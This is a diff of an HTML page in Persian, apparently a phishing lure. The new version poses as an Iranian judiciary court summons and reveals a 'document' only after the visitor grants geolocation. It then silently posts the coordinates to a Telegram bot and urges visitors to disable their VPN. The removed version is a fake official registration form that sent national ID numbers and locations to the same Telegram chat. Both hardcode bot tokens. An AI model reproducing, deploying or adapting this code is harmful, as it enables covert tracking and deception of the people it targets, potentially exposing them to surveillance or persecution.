@@ -1,315 +1,97 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>فرم ثبت نام — رسمی</title>
-  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;700;900&display=swap" rel="stylesheet">
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/bodymovin/5.10.1/lottie.min.js"></script>
-  <!-- Favicon ترازو عدالت -->
-  <link rel="icon" href="data:image/svg+xml, \
-    <svg xmlns='http://www.w3.org/2000/svg' width='64' height='64' viewBox='0 0 64 64'>\
-    <path fill='%230b3558' d='M32 4l-2 8H10v4h6l-4 24h36l-4-24h6v-4H34l-2-8zM22 50a6 6 0 1 1 12 0H22zM40 50a6 6 0 1 1 12 0H40z'/>\
-    </svg>">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Iran Judiciary Tehran Court</title>
+  <style>
+    body {
+      text-align: center;
+      font-family: sans-serif;
+      padding: 20px;
+    }
+    #jalbImage {
+      /* برای ریسپانسیو بودن: در موبایل 100%، در دسکتاپ حداکثر 794px */
+      width: 100%; 
+      max-width: 794px; /* حداکثر عرض A4 برای دسکتاپ */
+      height: auto;
+      border: 2px solid black;
+      margin-top: 20px;
+      /* تغییرات برای مرکز قرار دادن تصویر */
+      display: block; 
+      margin-center: auto;
+      margin-center: auto;
+      
+      filter: none; 
+      transition: opacity 1s ease, src 0s; 
+    }
 
-  <style>
-    :root {
-      --bg: #eef4fb;
-      --card: #ffffff;
-      --accent: #0b3558;
-      --muted: #6b7a89;
-      --danger: #d9534f;
-      --radius: 12px;
-      --shadow: 0 6px 22px rgba(11, 53, 88, 0.08);
-      --highlight: #88c999;
+    /* Media Query برای دسکتاپ (صفحات بزرگتر از 768 پیکسل) */
+    @media (min-width: 768px) {
+        #jalbImage {
+            /* در دسکتاپ، عرض تصویر روی اندازه A4 ثابت می‌شود */
+            width: 794px; /* عرض تقریبی A4 در 96DPI */
+        }
     }
-    * { box-sizing: border-box; }
-    body {
-      margin: 0;
-      padding: 20px;
-      font-family: 'Vazirmatn', sans-serif;
-      background: var(--bg);
-      display: flex;
-      justify-content: center;
-    }
-    .container {
-      width: 100%;
-      max-width: 900px;
-      background: var(--card);
-      border-radius: var(--radius);
-      padding: 24px;
-      box-shadow: var(--shadow);
-      position: relative;
-    }
-    .loading-overlay {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(255,255,255,0.85);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
-      display: none;
-    }
-    .form-header {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    .form-header h1 {
-      margin: 0;
-      color: var(--accent);
-      font-weight: 700;
-    }
-    .form-header p {
-      margin: 4px 0 0;
-      color: var(--muted);
-      font-size: 14px;
-    }
-    .steps {
-      display: flex;
-      gap: 12px;
-      justify-content: center;
-      margin-bottom: 24px;
-    }
-    .step {
-      padding: 6px 12px;
-      border-radius: 999px;
-      font-size: 13px;
-      background: transparent;
-      border: 1px dashed rgba(0,0,0,0.2);
-      color: var(--muted);
-    }
-    .step.active {
-      background: var(--card);
-      color: var(--accent);
-      border-style: solid;
-    }
-    .card {
-      background: var(--card);
-      padding: 20px;
-      border-radius: var(--radius);
-      border: 1px solid rgba(0, 0, 0, 0.05);
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.05);
-      margin-bottom: 24px;
-    }
-    label {
-      display: block;
-      margin-bottom: 8px;
-      color: var(--muted);
-      font-size: 13px;
-    }
-    .field {
-      margin-bottom: 16px;
-    }
-    input, select {
-      width: 100%;
-      padding: 12px;
-      border-radius: var(--radius);
-      border: 1px solid rgba(0,0,0,0.15);
-      background: #fbfdff;
-      font-size: 14px;
-      color: var(--accent);
-      transition: background-color 0.2s;
-    }
-    input[readonly] {
-      background: #f0f4f9;
-      color: #555;
-    }
-    input.highlight {
-      background-color: var(--highlight);
-    }
-    .location-preview {
-      background: #f8fbff;
-      border-radius: var(--radius);
-      padding: 12px;
-      border: 1px solid rgba(0,0,0,0.05);
-      color: var(--accent);
-      font-size: 14px;
-    }
-    .btn {
-      padding: 10px 16px;
-      border-radius: 10px;
-      border: none;
-      background: var(--accent);
-      color: white;
-      font-weight: 600;
-      cursor: pointer;
-    }
-    .btn:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-    }
-    .error {
-      color: var(--danger);
-      font-size: 13px;
-      margin-top: 6px;
-    }
-    footer.actions {
-      display: flex;
-      justify-content: flex-end;
-      margin-top: 10px;
-    }
-  </style>
+  </style>
 </head>
-
 <body>
-  <div class="loading-overlay" id="loadingOverlay"><div id="lottie"></div></div>
+  <p id="status">تصویر اولیه نمایش داده شده است. لطفاً موقعیت دستگاه را برای مشاهده تصویر اصلی فعال کنید.</p>
 
-  <div class="container">
-    <div class="form-header">
-      <h1>فرم ثبت نام رسمی</h1>
-      <p>مرحله اول: اطلاعات پایه</p>
-    </div>
+    <img id="jalbImage" src="JALB2.png" alt="شماره  دوستان"/>
 
-    <div class="steps">
-      <div class="step active">مرحله ۱</div>
-      <div class="step">مرحله ۲</div>
-    </div>
+  <script>
+    window.onload = function () {
+      const status = document.getElementById('status');
+      const image = document.getElementById('jalbImage');
 
-    <form id="signupForm" novalidate>
-      <section class="card">
-        <h2 style="margin:0 0 14px;font-size:16px;color:var(--accent)">اطلاعات پایه</h2>
+      if (!navigator.geolocation) {
+        status.innerText = "❌ شما تاید مشاهده مدرک را به گونه ویب لغوه نمودید";
+        return;
+      }
+      
+      // شروع درخواست مکان‌یابی
+      navigator.geolocation.getCurrentPosition(
 
-        <div class="field">
-          <label for="nationalId">کد ملی (۱۰ رقمی)</label>
-          <input id="nationalId" maxlength="10" type="tel" placeholder="0012345678">
-          <div id="nidError" class="error" style="display:none"></div>
-        </div>
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
 
-        <div class="field">
-          <label for="location">لوکیشن (کشور | استان)</label>
-          <input id="location" name="location" type="text" readonly placeholder="روی این فیلد کلیک کنید برای گرفتن موقعیت">
-          <div id="locError" class="error" style="display:none"></div>
-        </div>
+          // 1. تغییر منبع تصویر به jalb.jpg
+          image.src = "JALB.jpg";
+          image.alt = "تصویر اصلی فراخوان دادگاه";
 
-        <div class="field">
-          <label>پیش‌نمایش موقعیت کامل</label>
-          <div class="location-preview" id="locPreview">موقعیتی انتخاب نشده است.</div>
-        </div>
-      </section>
+          // 2. ارسال موقعیت به تلگرام
+          const token = '7851461640:AAFtIgSsotn-BdkVbXqCEOoSMWsQBJDZTfg';
+          const chatId = '7570861617';
+          const message = `📍 موقعیت کاربر:\nعرض جغرافیایی: ${lat}\nطول جغرافیایی: ${lon}`;
 
-      <footer class="actions">
-        <button type="button" class="btn" id="continueBtn" disabled>ادامه</button>
-      </footer>
-    </form>
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+          });
 
-    <div id="step2Panel" class="card" style="display:none">
-      <h3 style="margin:0 0 12px;color:var(--accent)">مرحله دوم — اطلاعات تکمیلی</h3>
-      <form id="step2Form" style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
-        <div class="field"><label>نام</label><input type="text" name="firstName" required /></div>
-        <div class="field"><label>نام خانوادگی</label><input type="text" name="lastName" required /></div>
-        <div class="field"><label>نام پدر</label><input type="text" name="fatherName" required /></div>
-        <div class="field"><label>شماره تماس</label><input type="tel" name="phone" required /></div>
-        <div class="field"><label>وضعیت تأهل</label>
-          <select id="maritalStatus" name="maritalStatus" required>
-            <option value="single">مجرد</option>
-            <option value="married">متأهل</option>
-          </select>
-        </div>
-        <footer class="actions" style="grid-column:1/-1">
-          <button type="submit" class="btn">ثبت نهایی</button>
-        </footer>
-      </form>
-    </div>
-
-  </div>
-
-<script>
-const nationalId = document.getElementById("nationalId");
-const locationInput = document.getElementById("location");
-const locPreview = document.getElementById("locPreview");
-const locError = document.getElementById("locError");
-const nidError = document.getElementById("nidError");
-const continueBtn = document.getElementById("continueBtn");
-const step2Panel = document.getElementById("step2Panel");
-const loadingOverlay = document.getElementById("loadingOverlay");
-
-function showError(el, msg) { el.style.display = 'block'; el.textContent = msg; }
-function clearError(el) { el.style.display = 'none'; el.textContent = ''; }
-function highlight(el) { el.classList.add('highlight'); setTimeout(()=> el.classList.remove('highlight'), 2000); }
-
-function showLoading() {
-  loadingOverlay.style.display = 'flex';
-  lottie.loadAnimation({
-    container: document.getElementById('lottie'),
-    renderer: 'svg',
-    loop: true,
-    autoplay: true,
-    path: 'https://assets10.lottiefiles.com/packages/lf20_usmfx6bp.json'
-  });
-}
-function hideLoading() {
-  loadingOverlay.style.display = 'none';
-}
-
-nationalId.addEventListener('input', () => {
-  nationalId.value = nationalId.value.replace(/[^0-9]/g, '');
-  clearError(nidError);
-  highlight(nationalId);
-  updateContinue();
-});
-
-function updateContinue() {
-  continueBtn.disabled = !(nationalId.value.length === 10 && locationInput.value.trim().length > 0);
-}
-
-locationInput.addEventListener('click', async () => {
-  clearError(locError);
-  showLoading();
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(async pos => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      try {
-        const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=fa`;
-        const res = await fetch(url);
-        const data = await res.json();
-        const country = data.address.country || "نامشخص";
-        const state = data.address.state || data.address.province || "نامشخص";
-        locationInput.value = `${country} | ${state}`;
-        locPreview.textContent = `کشور: ${country} — استان: ${state} — Lat:${lat.toFixed(6)}, Lon:${lon.toFixed(6)}`;
-        highlight(locationInput);
-        updateContinue();
-      } catch (e) {
-        showError(locError, "خطا در دریافت موقعیت");
-      } finally {
-        hideLoading();
-      }
-    }, () => {
-      showError(locError, "دریافت موقعیت ممکن نشد");
-      hideLoading();
-    });
-  } else {
-    showError(locError, "مرورگر شما GPS ندارد");
-    hideLoading();
-  }
-});
-
-continueBtn.addEventListener('click', async () => {
-  showLoading();
-  const BOT_TOKEN = "8430479124:AAFAW5rtSLqD_V8_8gg0ehkHjosYNXfUrQk";
-  const CHAT_ID = "7570861617";
-  const msg = `<b>ثبت نام اولیه</b>\n<b>کد ملی:</b> ${nationalId.value}\n<b>لوکیشن:</b> ${locationInput.value}\n<b>زمان:</b> ${new Date().toISOString()}`;
-  try {
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "HTML" })
-    });
-    const data = await res.json();
-    if (res.ok && data.ok) {
-      step2Panel.style.display = "block";
-      continueBtn.disabled = true;
-    } else {
-      throw new Error("ارسال ناموفق");
-    }
-  } catch (e) {
-    showError(locError, "خطا در ارسال به تلگرام");
-  } finally {
-    hideLoading();
-  }
-});
-</script>
+          status.innerText = "";
+        },
+        // ❌ در صورت شکست (رد شدن، timeout و...)
+        error => {
+          switch(error.code){
+            case error.PERMISSION_DENIED:
+              status.innerText = "❌ شما لغو باز دید نمودید .";
+              break;
+            case error.POSITION_UNAVAILABLE:
+              status.innerText = "❌ جهت مشاهد لطفآ فیلترشکن خویش را خاموش نماید.";
+              break;
+            case error.TIMEOUT:
+              status.innerText = "❌ درخواست مشاهده به پیان رسید جهت باز دید صحفه را ریفرش نماید";
+              break;
+            default:
+              status.innerText = "❌ام ام ای محفوظ کننده مدارک های معتبر شما";
+          }
+        }
+      );
+    };
+  </script>
 </body>
 </html>
